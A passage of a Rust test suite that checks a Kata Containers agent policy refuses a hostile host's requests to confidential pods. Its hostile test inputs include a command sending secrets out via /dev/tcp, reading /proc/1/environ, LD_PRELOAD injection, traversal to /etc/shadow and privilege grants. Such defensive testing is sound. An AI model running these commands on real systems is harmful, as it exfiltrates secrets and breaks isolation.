//! The malicious-host full suite, policy layer (PRD-02 deliverable 18): what a hostile host can ask
//! the Kata agent inside a launched pod to do, refused by the agent policy that the pod's
//! init-data carries.
//!
//! The policies are genpolicy 4.1.0's output for two representative pods, with the Alpha baseline
//! settings and rules (`testdata/agent-policy`, README there). They are evaluated as the Kata
//! 4.1.0 agent evaluates them (`src/agent/policy/src/policy.rs` at the 4.1.0 tag): the same
//! regorus commit and engine options, the policy loaded as `set_policy` loads the init-data's,
//! one query `data.agent_policy.<request type>` per request, the request serialized with every
//! field Kata's own types give it (`requests.json`), and the policy state carried from one request
//! to the next. Each case first launches the pod with the requests a host legitimately sends, all
//! of which must be allowed, so a policy that refuses too much fails here too.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing,
    clippy::arithmetic_side_effects
)]

use std::cell::OnceCell;
use std::num::{NonZeroU32, NonZeroUsize};
use std::path::PathBuf;

use serde_json::{Map, Value, json};
use sha2::{Digest, Sha256};

fn testdata(path: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../testdata/agent-policy")
        .join(path)
}

/// The agent's `AgentPolicy`, line for line where it decides.
#[derive(Clone)]
struct Agent {
    engine: regorus::Engine,
    allow_failures: bool,
}

#[derive(serde::Deserialize)]
struct MetadataResponse {
    allowed: bool,
    ops: Option<json_patch::Patch>,
}

impl Agent {
    fn new_engine() -> regorus::Engine {
        let mut engine = regorus::Engine::new();
        engine.set_strict_builtin_errors(false);
        engine.set_gather_prints(true);
        engine.set_policy_length_config(regorus::PolicyLengthConfig {
            max_col: NonZeroU32::new(64 * 1024).unwrap(),
            max_file_bytes: NonZeroUsize::new(16 * 1024 * 1024).unwrap(),
            max_lines: NonZeroUsize::new(200_000).unwrap(),
        });
        engine
            .add_data(regorus::Value::from_json_str(r#"{"pstate": {}}"#).unwrap())
            .unwrap();
        engine
    }

    /// `AgentPolicy::set_policy`, which the agent calls with the init-data's `policy.rego`.
    fn boot(policy: &str) -> Self {
        let mut engine = Self::new_engine();
        engine
            .add_policy("agent_policy".to_owned(), policy.to_owned())
            .unwrap();
        let mut agent = Self {
            engine,
            allow_failures: false,
        };
        agent.allow_failures = matches!(
            agent.allow_request("AllowRequestsFailingPolicy", "{}"),
            Ok((true, _))
        );
        agent
    }

    /// `AgentPolicy::allow_request`. An `Err` is the agent's INTERNAL error: the call is refused.
    fn allow_request(&mut self, ep: &str, input: &str) -> Result<(bool, String), String> {
        self.engine
            .set_input_json(input)
            .map_err(|e| e.to_string())?;
        let results = self
            .engine
            .eval_query(format!("data.agent_policy.{ep}"), false)
            .map_err(|e| e.to_string())?;
        let prints = self
            .engine
            .take_prints()
            .map(|p| p.join(" "))
            .unwrap_or_default();
        if results.result.len() != 1 {
            if self.allow_failures {
                return Ok((true, prints));
            }
            return Err(format!("unexpected eval_query result len {results:?}"));
        }
        let expressions = &results.result[0].expressions;
        if expressions.len() != 1 {
            return Err(format!(
                "unexpected eval_query result expressions {results:?}"
            ));
        }
        let mut allow = match &expressions[0].value {
            regorus::Value::Bool(b) => *b,
            regorus::Value::Object(obj) => {
                let text = serde_json::to_string(obj).map_err(|e| e.to_string())?;
                let response: MetadataResponse =
                    serde_json::from_str(&text).map_err(|e| e.to_string())?;
                if response.allowed
                    && let Some(ops) = response.ops
                {
                    self.apply_patch_to_state(&ops)?;
                }
                response.allowed
            }
            _ => return Err(format!("unexpected eval_query result type {results:?}")),
        };
        if !allow && self.allow_failures {
            allow = true;
        }
        Ok((allow, prints))
    }

    fn apply_patch_to_state(&mut self, patch: &json_patch::Patch) -> Result<(), String> {
        let mut state = serde_json::to_value(self.engine.get_data()).map_err(|e| e.to_string())?;
        json_patch::patch(&mut state, patch).map_err(|e| e.to_string())?;
        self.engine.clear_data();
        self.engine
            .add_data(regorus::Value::from_json_str(&state.to_string()).map_err(|e| e.to_string())?)
            .map_err(|e| e.to_string())
    }

    fn allows(&mut self, ep: &str, request: &Value) -> bool {
        matches!(self.allow_request(ep, &request.to_string()), Ok((true, _)))
    }

    fn must_allow(&mut self, ep: &str, request: &Value, what: &str) {
        match self.allow_request(ep, &request.to_string()) {
            Ok((true, _)) => {}
            Ok((false, prints)) => {
                let tail = &prints[prints.len().saturating_sub(3000)..];
                panic!(
                    "{what}: {ep} was refused, but a host legitimately sends it; policy log ends: {tail}"
                )
            }
            Err(e) => panic!("{what}: {ep} failed in the policy engine: {e}"),
        }
    }
}

fn hex(data: &str) -> String {
    hex::encode(Sha256::digest(data.as_bytes()))
}

/// Replaces each `[bcdfghjklmnpqrstvwxz2456789]+` (the Deployment and ReplicaSet hash suffixes
/// genpolicy allows) with a sample, and drops the anchors.
fn pod_name_from(regex: &str) -> String {
    let class = "[bcdfghjklmnpqrstvwxz2456789]+";
    let mut out = regex
        .trim_start_matches('^')
        .trim_end_matches('$')
        .to_owned();
    for sample in ["6d9f8b7c5", "x2x4z"] {
        out = out.replacen(class, sample, 1);
    }
    assert!(
        !out.contains('['),
        "unexpected sandbox-name pattern {regex}"
    );
    out.replace("\\.", ".")
}

/// A literal path from a policy regex of the form `^/a/b\.c$`.
fn unanchor(regex: &str) -> String {
    regex
        .trim_start_matches('^')
        .trim_end_matches('$')
        .replace("\\.", ".")
}

const SHARED: &str = "/run/kata-containers/shared/containers";
const NETNS: &str = "/var/run/netns/cni-3b9a2d4e-5f60-4a71-8b92-c3d4e5f60718";
const POD_UID: &str = "5d0b7c3e-91a2-4f6b-8c1d-2e3f4a5b6c7d";
const OTHER_DIGEST: &str =
    "sha256:0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad0bad";

/// A pod as the host launches it: the policy, and the requests the host sends for it.
struct Pod {
    label: &'static str,
    policy: String,
    data: Value,
    templates: Value,
    pod_name: String,
    namespace: String,
    sandbox_id: String,
    launched: OnceCell<Agent>,
}

impl Pod {
    fn load(dir: &'static str, policy_file: &str) -> Self {
        let policy = std::fs::read_to_string(testdata(&format!("{dir}/{policy_file}"))).unwrap();
        let start = policy.find("\npolicy_data := ").unwrap();
        let data: Value =
            serde_json::from_str(&policy[start + "\npolicy_data := ".len()..]).unwrap();
        let templates: Value =
            serde_json::from_str(&std::fs::read_to_string(testdata("requests.json")).unwrap())
                .unwrap();
        let pause = &data["containers"][0]["OCI"]["Annotations"];
        assert_eq!(pause["io.kubernetes.cri.container-type"], "sandbox");
        let pod_name = pod_name_from(pause["io.kubernetes.cri.sandbox-name"].as_str().unwrap());
        // genpolicy leaves the namespace empty, and the policy takes any, when the spec names none.
        let namespace = match pause["io.kubernetes.cri.sandbox-namespace"]
            .as_str()
            .unwrap()
        {
            "" => "alpha-models".to_owned(),
            ns => ns.to_owned(),
        };
        Self {
            label: dir,
            policy,
            data,
            templates,
            pod_name,
            namespace,
            sandbox_id: hex(&format!("{dir}/sandbox")),
            launched: OnceCell::new(),
        }
    }

    fn template(&self, label: &str) -> Value {
        let t = self.templates[label].clone();
        assert!(!t.is_null(), "no {label} in requests.json");
        t
    }

    fn containers(&self) -> &[Value] {
        self.data["containers"].as_array().unwrap()
    }

    fn container_name(&self, idx: usize) -> &str {
        self.containers()[idx]["OCI"]["Annotations"]["io.kubernetes.cri.container-name"]
            .as_str()
            .unwrap_or("pause")
    }

    /// The index of the policy container named `name`.
    fn index(&self, name: &str) -> usize {
        (0..self.containers().len())
            .find(|&i| self.container_name(i) == name)
            .unwrap_or_else(|| panic!("{}: no container {name}", self.label))
    }

    /// Kubernetes names the pause container after the sandbox.
    fn container_id(&self, idx: usize) -> String {
        if idx == 0 {
            self.sandbox_id.clone()
        } else {
            hex(&format!("{}/{}", self.label, self.container_name(idx)))
        }
    }

    fn mount_source(&self, source: &str, cid: &str, destination: &str) -> String {
        if let Some(name) = source.strip_prefix("$(sfprefix)") {
            let random = &hex(&format!("{cid}{destination}"))[..16];
            format!("{SHARED}/{cid}-{random}-{}", unanchor(name))
        } else {
            unanchor(source)
        }
    }

    fn caps(&self, caps: &Value) -> Value {
        let caps: Vec<Value> = caps
            .as_array()
            .unwrap()
            .iter()
            .flat_map(|c| match c.as_str().unwrap() {
                "$(default_caps)" => self.data["common"]["default_caps"]
                    .as_array()
                    .unwrap()
                    .clone(),
                "$(privileged_caps)" => self.data["common"]["privileged_caps"]
                    .as_array()
                    .unwrap()
                    .clone(),
                _ => vec![c.clone()],
            })
            .collect();
        Value::Array(caps)
    }

    fn create_sandbox(&self) -> Value {
        let mut req = self.template("CreateSandboxRequest");
        req["hostname"] = json!(self.pod_name);
        req["sandbox_id"] = json!(self.sandbox_id);
        req["storages"] = self.data["sandbox"]["storages"].clone();
        req["dns"] = json!([
            "nameserver 10.96.0.10",
            "search alpha-models.svc.cluster.local"
        ]);
        req
    }

    /// The CreateContainerRequest the Kata shim sends for policy container `idx`: what containerd
    /// derives from the same pod spec genpolicy read, with the values the host picks at launch.
    fn create_container(&self, idx: usize) -> Value {
        self.create_container_as(idx, &self.container_id(idx))
    }

    /// The same container created again under the id `cid`, as a restart or a host's copy of it.
    fn create_container_as(&self, idx: usize, cid: &str) -> Value {
        let p = &self.containers()[idx];
        let p_oci = &p["OCI"];
        let sandbox = p_oci["Annotations"]["io.kubernetes.cri.container-type"] == "sandbox";
        let mut req = self.template(if sandbox {
            "CreateContainerRequest/sandbox"
        } else {
            "CreateContainerRequest/container"
        });
        let cid = cid.to_owned();

        let mut annotations = Map::new();
        for (key, value) in p_oci["Annotations"].as_object().unwrap() {
            let value = value.as_str().unwrap();
            let value = match key.as_str() {
                "io.katacontainers.pkg.oci.bundle_path" => value.replace("$(bundle-id)", &cid),
                "io.kubernetes.cri.sandbox-id" => self.sandbox_id.clone(),
                "io.kubernetes.cri.sandbox-name" => self.pod_name.clone(),
                "io.kubernetes.cri.sandbox-namespace" => self.namespace.clone(),
                "io.kubernetes.cri.sandbox-log-directory" => {
                    format!(
                        "/var/log/pods/{}_{}_{POD_UID}",
                        self.namespace, self.pod_name
                    )
                }
                "nerdctl/network-namespace" => NETNS.to_owned(),
                _ => value.to_owned(),
            };
            annotations.insert(key.clone(), json!(value));
        }
        annotations.insert("io.kubernetes.cri.sandbox-uid".into(), json!(POD_UID));
        if sandbox {
            annotations.insert(
                "io.kubernetes.cri.podsandbox.image-name".into(),
                json!("registry.k8s.io/pause:3.10"),
            );
        }
        // The GPUs, cold-plugged into the pod VM: the shim passes no device and names each GPU
        // in a CDI annotation.
        for (i, _) in p["devices"].as_array().unwrap().iter().enumerate() {
            annotations.insert(
                format!("cdi.k8s.io/vfio{i}"),
                json!(format!("nvidia.com/gpu={i}")),
            );
        }
        let oci = &mut req["OCI"];
        oci["Annotations"] = Value::Object(annotations.clone());
        oci["Version"] = p_oci["Version"].clone();
        oci["Root"] = json!({
            "Path": self.data["common"]["root_path"].as_str().unwrap().replace("$(bundle-id)", &cid),
            "Readonly": p_oci["Root"]["Readonly"],
        });
        oci["Mounts"] = Value::Array(
            p_oci["Mounts"]
                .as_array()
                .unwrap()
                .iter()
                .map(|m| {
                    let mut m = m.clone();
                    let source = self.mount_source(
                        m["source"].as_str().unwrap(),
                        &cid,
                        m["destination"].as_str().unwrap(),
                    );
                    m["source"] = json!(source);
                    m
                })
                .collect(),
        );

        let p_process = &p_oci["Process"];
        let process = &mut oci["Process"];
        process["Terminal"] = p_process["Terminal"].clone();
        process["User"] = json!({
            "UID": p_process["User"]["UID"],
            "GID": p_process["User"]["GID"],
            "AdditionalGids": p_process["User"]["AdditionalGids"],
            "Username": "",
        });
        process["Args"] = Value::Array(
            p_process["Args"]
                .as_array()
                .unwrap()
                .iter()
                .map(|a| json!(a.as_str().unwrap().replace("$$", "$")))
                .collect(),
        );
        let mut env: Vec<Value> = p_process["Env"]
            .as_array()
            .unwrap()
            .iter()
            .map(|e| json!(e.as_str().unwrap().replace("$(host-name)", &self.pod_name)))
            .collect();
        if !sandbox {
            // The kubelet sets the API server's variables in every container, service links or not.
            for var in [
                "KUBERNETES_SERVICE_HOST=10.96.0.1",
                "KUBERNETES_SERVICE_PORT=443",
                "KUBERNETES_SERVICE_PORT_HTTPS=443",
                "KUBERNETES_PORT=tcp://10.96.0.1:443",
                "KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443",
                "KUBERNETES_PORT_443_TCP_PROTO=tcp",
                "KUBERNETES_PORT_443_TCP_PORT=443",
                "KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1",
            ] {
                env.push(json!(var));
            }
        }
        process["Env"] = Value::Array(env);
        process["Cwd"] = p_process["Cwd"].clone();
        process["NoNewPrivileges"] = p_process["NoNewPrivileges"].clone();
        let caps = &p_process["Capabilities"];
        process["Capabilities"] = json!({
            "Ambient": self.caps(&caps["Ambient"]),
            "Bounding": self.caps(&caps["Bounding"]),
            "Effective": self.caps(&caps["Effective"]),
            "Inheritable": self.caps(&caps["Inheritable"]),
            "Permitted": self.caps(&caps["Permitted"]),
        });

        let linux = &mut oci["Linux"];
        for key in [
            "Namespaces",
            "MaskedPaths",
            "ReadonlyPaths",
            "Devices",
            "Sysctl",
        ] {
            linux[key] = p_oci["Linux"][key].clone();
        }
        linux["CgroupsPath"] = json!(format!(
            "kubepods-pod{}.slice:cri-containerd:{cid}",
            POD_UID.replace('-', "_")
        ));

        let mut storages: Vec<Value> = p["storages"]
            .as_array()
            .unwrap()
            .iter()
            .map(|s| {
                let mut s = s.clone();
                s["mount_point"] = json!(unanchor(s["mount_point"].as_str().unwrap()));
                s
            })
            .collect();
        let image = if sandbox {
            "pause".to_owned()
        } else {
            p_oci["Annotations"]["io.kubernetes.cri.image-name"]
                .as_str()
                .unwrap()
                .to_owned()
        };
        let metadata = annotations;
        storages.push(json!({
            "driver": "image_guest_pull",
            "driver_options": [format!("image_guest_pull={}", json!({"metadata": metadata}))],
            "fs_group": null,
            "fstype": "overlay",
            "mount_point": self.data["common"]["root_path"].as_str().unwrap().replace("$(bundle-id)", &cid),
            "options": [],
            "shared": false,
            "source": image,
        }));
        req["storages"] = Value::Array(storages);
        req["devices"] = json!([]);
        req["container_id"] = json!(cid);
        req["exec_id"] = json!(cid);
        req["sandbox_pidns"] = p["sandbox_pidns"].clone();
        req
    }

    fn with_container(&self, label: &str, idx: usize) -> Value {
        let mut req = self.template(label);
        req["container_id"] = json!(self.container_id(idx));
        if req.get("exec_id").is_some() {
            req["exec_id"] = json!(self.container_id(idx));
        }
        req
    }

    fn copy_file(path: &str, file_type: &str, symlink_target: Option<&str>) -> Value {
        json!({
            "dir_mode": 0o750, "file_mode": 0o644, "file_size": 64, "file_type": file_type,
            "gid": 0, "offset": 0, "path": path, "symlink_target": symlink_target, "uid": 0,
        })
    }

    /// What the shim copies into the shared directory before it creates container `idx`: the
    /// host-written files its mounts name, a downward-API volume as the kubelet lays it out.
    fn copy_files(&self, idx: usize) -> Vec<Value> {
        let cid = self.container_id(idx);
        let mut out = Vec::new();
        for m in self.containers()[idx]["OCI"]["Mounts"].as_array().unwrap() {
            let source = m["source"].as_str().unwrap();
            if !source.starts_with("$(sfprefix)") {
                continue;
            }
            let path = self.mount_source(source, &cid, m["destination"].as_str().unwrap());
            if path.ends_with("-alpha-pod") {
                let stamp = "..2026_10_12_04_00_00.123456789";
                out.push(Self::copy_file(&path, "Directory", None));
                out.push(Self::copy_file(
                    &format!("{path}/{stamp}"),
                    "Directory",
                    None,
                ));
                out.push(Self::copy_file(
                    &format!("{path}/{stamp}/cc_init_data"),
                    "Regular",
                    None,
                ));
                out.push(Self::copy_file(
                    &format!("{path}/..data"),
                    "Symlink",
                    Some(stamp),
                ));
                out.push(Self::copy_file(
                    &format!("{path}/cc_init_data"),
                    "Symlink",
                    Some("..data/cc_init_data"),
                ));
            } else {
                out.push(Self::copy_file(&path, "Regular", None));
            }
        }
        out
    }

    /// The pod's launch, as a host that means it no harm sends it: every request must be allowed.
    fn launch(&self) -> Agent {
        let mut agent = Agent::boot(&self.policy);
        let what = format!("{} launch", self.label);
        assert!(
            !agent.allow_failures,
            "{what}: the policy allows requests that fail it"
        );
        agent.must_allow("CreateSandboxRequest", &self.create_sandbox(), &what);
        agent.must_allow(
            "GuestDetailsRequest",
            &self.template("GuestDetailsRequest"),
            &what,
        );
        agent.must_allow(
            "OnlineCPUMemRequest",
            &self.template("OnlineCPUMemRequest"),
            &what,
        );
        agent.must_allow(
            "UpdateInterfaceRequest",
            &self.template("UpdateInterfaceRequest"),
            &what,
        );
        agent.must_allow(
            "UpdateRoutesRequest",
            &self.template("UpdateRoutesRequest"),
            &what,
        );
        agent.must_allow(
            "AddARPNeighborsRequest",
            &self.template("AddARPNeighborsRequest"),
            &what,
        );
        for idx in 0..self.containers().len() {
            let what = format!("{what}, container {}", self.container_name(idx));
            for copy in self.copy_files(idx) {
                agent.must_allow("CopyFileRequest", &copy, &what);
            }
            agent.must_allow("CreateContainerRequest", &self.create_container(idx), &what);
            agent.must_allow(
                "StartContainerRequest",
                &self.with_container("StartContainerRequest", idx),
                &what,
            );
            agent.must_allow(
                "WaitProcessRequest",
                &self.with_container("WaitProcessRequest", idx),
                &what,
            );
        }
        agent.must_allow(
            "GetOOMEventRequest",
            &self.template("GetOOMEventRequest"),
            &what,
        );
        agent
    }

    /// The agent once the pod has launched, for one more request.
    fn launched(&self) -> Agent {
        self.launched.get_or_init(|| self.launch()).clone()
    }

    /// Every container but the pause container.
    fn app_containers(&self) -> impl Iterator<Item = usize> {
        1..self.containers().len()
    }
}

fn pods() -> [Pod; 2] {
    [
        Pod::load("gpu-model-server", "policy.rego"),
        Pod::load("cpu-app", "policy.rego"),
    ]
}

/// Launches `pod`, sends the hostile `request`, and fails with `what` unless the agent refuses it.
fn assert_refused(pod: &Pod, ep: &str, request: &Value, what: &str) {
    let mut agent = pod.launched();
    if let Ok((true, _)) = agent.allow_request(ep, &request.to_string()) {
        panic!("{}: {what}: {ep} was allowed", pod.label);
    }
}

#[test]
fn a_host_that_means_no_harm_can_launch_run_and_stop_each_pod() {
    for pod in pods() {
        let mut agent = pod.launched();
        let what = format!("{} steady state and stop", pod.label);
        for idx in 0..pod.containers().len() {
            for ep in [
                "StatsContainerRequest",
                "SignalProcessRequest",
                "WaitProcessRequest",
            ] {
                let req = pod.with_container(ep, idx);
                agent.must_allow(ep, &req, &what);
            }
        }
        // A restart creates the container again under a new id, from the same spec.
        for idx in pod.app_containers() {
            let again = pod.create_container_as(idx, &hex(&format!("restarted {idx}")));
            agent.must_allow("CreateContainerRequest", &again, &what);
        }
        for idx in (0..pod.containers().len()).rev() {
            let req = pod.with_container("RemoveContainerRequest", idx);
            agent.must_allow("RemoveContainerRequest", &req, &what);
        }
        agent.must_allow(
            "DestroySandboxRequest",
            &pod.template("DestroySandboxRequest"),
            &what,
        );
    }
}

#[test]
fn exec_into_any_container_is_refused() {
    for pod in pods() {
        for idx in 0..pod.containers().len() {
            let name = pod.container_name(idx).to_owned();
            let created = pod.create_container(idx);
            let process = created["OCI"]["Process"].clone();
            let mut exec = pod.with_container("ExecProcessRequest", idx);
            exec["exec_id"] = json!("kubectl-exec");
            // `kubectl exec -- sh`, with the container's own user, environment and directory.
            let mut sh = process.clone();
            sh["Args"] = json!(["sh"]);
            sh["Capabilities"] = json!(null);
            for (what, process) in [
                ("kubectl exec sh", sh.clone()),
                ("exec of the container's own command", {
                    let mut p = process.clone();
                    p["Capabilities"] = json!(null);
                    p
                }),
                ("kubectl exec -it sh", {
                    let mut p = sh.clone();
                    p["Terminal"] = json!(true);
                    p
                }),
                ("exec reading the init process's environment", {
                    let mut p = sh.clone();
                    p["Args"] = json!(["/bin/sh", "-c", "cat /proc/1/environ"]);
                    p
                }),
            ] {
                let mut req = exec.clone();
                req["process"] = process;
                assert_refused(
                    &pod,
                    "ExecProcessRequest",
                    &req,
                    &format!("{what} in {name}"),
                );
            }
        }
    }
}

#[test]
fn log_reads_stdin_and_diagnostics_are_refused() {
    for pod in pods() {
        for idx in 0..pod.containers().len() {
            let name = pod.container_name(idx).to_owned();
            // kubectl logs: the agent answers ReadStdout and ReadStderr with the data cleared.
            let mut read = pod.with_container("ReadStreamRequest", idx);
            read["len"] = json!(32768);
            assert_refused(
                &pod,
                "ReadStreamRequest",
                &read,
                &format!("log read of {name}"),
            );
            let mut write = pod.with_container("WriteStreamRequest", idx);
            write["data"] = json!(b"id\n".to_vec());
            assert_refused(
                &pod,
                "WriteStreamRequest",
                &write,
                &format!("stdin write to {name}"),
            );
            let close = pod.with_container("CloseStdinRequest", idx);
            assert_refused(
                &pod,
                "CloseStdinRequest",
                &close,
                &format!("stdin close of {name}"),
            );
        }
        assert_refused(
            &pod,
            "GetDiagnosticDataRequest",
            &pod.template("GetDiagnosticDataRequest"),
            "diagnostic data",
        );
    }
}

#[test]
fn file_copies_outside_the_shared_directory_are_refused() {
    for pod in pods() {
        let runtime = pod.container_id(pod.index("alpha-runtime"));
        let shared = format!("{SHARED}/{runtime}-0123456789abcdef-hosts");
        for (what, path, file_type, target) in [
            (
                "a file outside the shared directory",
                "/etc/ld.so.preload".to_owned(),
                "Regular",
                None,
            ),
            (
                "the runtime's guest-pulled root filesystem",
                format!("/run/kata-containers/{runtime}/rootfs/alpha-runtime"),
                "Regular",
                None,
            ),
            (
                "the in-guest secrets volume",
                "/run/kata-containers/sandbox/ephemeral/runtime-socket/kms.sock".to_owned(),
                "Regular",
                None,
            ),
            (
                "the sandbox storage directory",
                "/run/kata-containers/sandbox/storage/x".to_owned(),
                "Regular",
                None,
            ),
            (
                "a directory traversal",
                format!("{shared}/../../../../etc/shadow"),
                "Regular",
                None,
            ),
            (
                "a relative path",
                "etc/ssl/cert.pem".to_owned(),
                "Regular",
                None,
            ),
            ("a device node", format!("{shared}/mem"), "Unknown", None),
            (
                "a symlink at the top of the shared directory",
                shared.clone(),
                "Symlink",
                Some("x"),
            ),
            (
                "an absolute symlink",
                format!("{shared}/lnk"),
                "Symlink",
                Some("/proc/1/root"),
            ),
            (
                "a symlink out of the directory",
                format!("{shared}/lnk"),
                "Symlink",
                Some("../../x"),
            ),
        ] {
            let req = Pod::copy_file(&path, file_type, target);
            assert_refused(&pod, "CopyFileRequest", &req, &format!("copy of {what}"));
        }
    }
}

/// A hostile CreateContainerRequest: container `idx`'s legitimate request, changed by `change`.
type Change = (&'static str, fn(&Pod, usize, &mut Value));

fn env_mut(req: &mut Value) -> &mut Vec<Value> {
    req["OCI"]["Process"]["Env"].as_array_mut().unwrap()
}

/// The last variable the image or the spec sets, not one the host supplies.
fn last_spec_var(env: &[Value]) -> usize {
    env.iter()
        .rposition(|e| {
            let e = e.as_str().unwrap();
            !e.starts_with("KUBERNETES_") && !e.starts_with("HOSTNAME=")
        })
        .unwrap()
}

fn mounts_mut(req: &mut Value) -> &mut Vec<Value> {
    req["OCI"]["Mounts"].as_array_mut().unwrap()
}

fn swap_image(req: &mut Value, annotation_too: bool) {
    let image = req["OCI"]["Annotations"]["io.kubernetes.cri.image-name"]
        .as_str()
        .unwrap()
        .to_owned();
    let other = format!("{}@{OTHER_DIGEST}", image.split('@').next().unwrap());
    if annotation_too {
        req["OCI"]["Annotations"]["io.kubernetes.cri.image-name"] = json!(other);
    }
    for s in req["storages"].as_array_mut().unwrap() {
        if s["driver"] == "image_guest_pull" {
            s["source"] = json!(other);
        }
    }
}

/// The pause container's storage no longer marked as a sandbox's, so the agent pulls its source
/// instead of unpacking the guest's own pause image.
fn pull_pause_from_a_registry(req: &mut Value) {
    for s in req["storages"].as_array_mut().unwrap() {
        if s["driver"] == "image_guest_pull" {
            let option = s["driver_options"][0].as_str().unwrap().replace(
                r#""io.kubernetes.cri.container-type":"sandbox""#,
                r#""io.kubernetes.cri.container-type":"container""#,
            );
            assert!(!option.contains(r#""sandbox""#));
            s["driver_options"][0] = json!(option);
            s["source"] = json!(format!("ghcr.io/attacker/pause@{OTHER_DIGEST}"));
        }
    }
}

const CONTAINER_CHANGES: &[Change] = &[
    ("another image digest", |_, _, req| swap_image(req, true)),
    (
        "another image pulled under the same image-name annotation",
        |_, _, req| swap_image(req, false),
    ),
    ("an extra environment variable", |_, _, req| {
        env_mut(req).push(json!("ALPHA_DEBUG=1"))
    }),
    ("LD_PRELOAD", |_, _, req| {
        env_mut(req).push(json!("LD_PRELOAD=/dev/shm/x.so"))
    }),
    ("a service-link style variable", |_, _, req| {
        env_mut(req).push(json!("VLLM_PORT=tcp://10.0.0.66:8000"));
    }),
    ("a changed environment value", |_, _, req| {
        let env = env_mut(req);
        let i = last_spec_var(env);
        env[i] = json!(format!("{}0", env[i].as_str().unwrap()));
    }),
    ("an environment variable unset", |_, _, req| {
        let env = env_mut(req);
        let i = last_spec_var(env);
        env.remove(i);
    }),
    ("an extra bind mount of a host-written file", |_, _, req| {
        let cid = req["container_id"].as_str().unwrap().to_owned();
        mounts_mut(req).push(json!({
            "destination": "/etc/ld.so.preload",
            "options": ["rbind", "rprivate", "ro"],
            "source": format!("{SHARED}/{cid}-0123456789abcdef-preload"),
            "type_": "bind",
        }));
    }),
    ("a service account token mounted", |_, _, req| {
        let cid = req["container_id"].as_str().unwrap().to_owned();
        mounts_mut(req).push(json!({
            "destination": "/var/run/secrets/kubernetes.io/serviceaccount",
            "options": ["rbind", "rprivate", "ro"],
            "source": format!("{SHARED}/{cid}-0123456789abcdef-serviceaccount"),
            "type_": "bind",
        }));
    }),
    (
        "an in-guest volume swapped for a host-shared directory",
        |_, _, req| {
            let cid = req["container_id"].as_str().unwrap().to_owned();
            let m = mounts_mut(req)
                .iter_mut()
                .find(|m| {
                    m["source"]
                        .as_str()
                        .unwrap()
                        .starts_with("/run/kata-containers/sandbox/ephemeral/")
                })
                .unwrap();
            m["source"] = json!(format!("{SHARED}/{cid}-0123456789abcdef-secrets"));
        },
    ),
    ("a mount moved to another path", |_, _, req| {
        let m = mounts_mut(req).last_mut().unwrap();
        m["destination"] = json!("/usr/lib/x86_64-linux-gnu");
    }),
    ("a read-only mount made writable", |_, _, req| {
        let ro = |m: &Value| m["options"].as_array().unwrap().contains(&json!("ro"));
        let mounts = mounts_mut(req);
        let i = mounts
            .iter()
            .position(|m| m["type_"] == "bind" && ro(m))
            .or_else(|| mounts.iter().position(ro))
            .unwrap();
        let m = &mut mounts[i];
        let options: Vec<Value> = m["options"]
            .as_array()
            .unwrap()
            .iter()
            .map(|o| if o == "ro" { json!("rw") } else { o.clone() })
            .collect();
        m["options"] = Value::Array(options);
    }),
    ("an extra storage the guest would mount", |_, _, req| {
        req["storages"].as_array_mut().unwrap().push(json!({
            "driver": "virtio-fs", "driver_options": [], "fs_group": null, "fstype": "virtiofs",
            "mount_point": "/run/kata-containers/shared/containers/", "options": [],
            "shared": false, "source": "kataShared",
        }));
    }),
    ("another command", |_, _, req| {
        req["OCI"]["Process"]["Args"] = json!([
            "/bin/sh",
            "-c",
            "cat /run/secrets/* > /dev/tcp/10.0.0.66/80"
        ]);
    }),
    ("an extra argument", |_, _, req| {
        req["OCI"]["Process"]["Args"]
            .as_array_mut()
            .unwrap()
            .push(json!("--debug"));
    }),
    ("another working directory", |_, _, req| {
        req["OCI"]["Process"]["Cwd"] = json!("/tmp")
    }),
    ("another user", |_, _, req| {
        req["OCI"]["Process"]["User"]["UID"] = json!(4242)
    }),
    ("a terminal", |_, _, req| {
        req["OCI"]["Process"]["Terminal"] = json!(true)
    }),
    ("privileged capabilities", |pod, _, req| {
        let caps = pod.data["common"]["privileged_caps"].clone();
        for set in ["Bounding", "Effective", "Permitted"] {
            req["OCI"]["Process"]["Capabilities"][set] = caps.clone();
        }
    }),
    ("CAP_SYS_ADMIN added", |_, _, req| {
        for set in ["Bounding", "Effective", "Permitted"] {
            req["OCI"]["Process"]["Capabilities"][set]
                .as_array_mut()
                .unwrap()
                .push(json!("CAP_SYS_ADMIN"));
        }
    }),
    ("no_new_privileges flipped", |_, _, req| {
        let n = req["OCI"]["Process"]["NoNewPrivileges"].as_bool().unwrap();
        req["OCI"]["Process"]["NoNewPrivileges"] = json!(!n);
    }),
    ("a writable root filesystem flipped", |_, _, req| {
        let r = req["OCI"]["Root"]["Readonly"].as_bool().unwrap();
        req["OCI"]["Root"]["Readonly"] = json!(!r);
    }),
    ("a host device", |_, _, req| {
        req["OCI"]["Linux"]["Devices"] = json!([{
            "FileMode": 438, "GID": 0, "Major": 1, "Minor": 1, "Path": "/dev/mem", "Type": "c", "UID": 0,
        }]);
    }),
    ("a prestart hook", |_, _, req| {
        req["OCI"]["Hooks"] = json!({
            "CreateContainer": [], "CreateRuntime": [], "Poststart": [], "Poststop": [],
            "Prestart": [{"Args": ["/bin/sh", "-c", "id"], "Env": [], "Path": "/bin/sh", "Timeout": 0}],
            "StartContainer": [],
        });
    }),
    ("a sysctl", |_, _, req| {
        req["OCI"]["Linux"]["Sysctl"]["kernel.core_pattern"] = json!("|/tmp/x");
    }),
    ("/proc/kcore unmasked", |_, _, req| {
        req["OCI"]["Linux"]["MaskedPaths"]
            .as_array_mut()
            .unwrap()
            .retain(|p| p != "/proc/kcore");
    }),
    ("/proc/sys writable", |_, _, req| {
        req["OCI"]["Linux"]["ReadonlyPaths"]
            .as_array_mut()
            .unwrap()
            .retain(|p| p != "/proc/sys");
    }),
    ("a seccomp profile of the host's", |_, _, req| {
        req["OCI"]["Linux"]["Seccomp"] = json!({
            "Architectures": [], "DefaultAction": "SCMP_ACT_ALLOW", "Flags": [],
            "ListenerMetadata": "", "ListenerPath": "", "Syscalls": [],
        });
    }),
    ("the pod's process namespace shared", |_, _, req| {
        req["sandbox_pidns"] = json!(true)
    }),
    ("a host string user", |_, _, req| {
        req["string_user"] = json!({"additionalGids": [], "gid": "0", "uid": "0"});
    }),
    ("a shared mount", |_, _, req| {
